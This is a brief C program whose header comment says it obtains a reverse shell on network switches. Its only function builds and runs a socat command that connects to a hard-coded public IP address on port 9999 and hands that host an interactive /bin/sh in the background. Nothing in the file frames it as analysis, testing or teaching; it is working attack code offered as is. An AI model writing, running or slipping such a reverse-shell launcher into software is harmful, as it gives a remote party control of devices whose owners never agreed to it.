//////////////////////////////////////////////////////////////////////
/// This file use for getting reverse shell of switches on live IP ///
//////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
  FILE *fp;
  char *cmd = malloc(100);

  sprintf(cmd, "socat TCP:43.250.164.50:9999 "
               "EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane &");

  fp = popen(cmd, "r");
  if (!fp) {
    perror("error");
    return -1;
  }

  pclose(fp);

  return EXIT_SUCCESS;
}
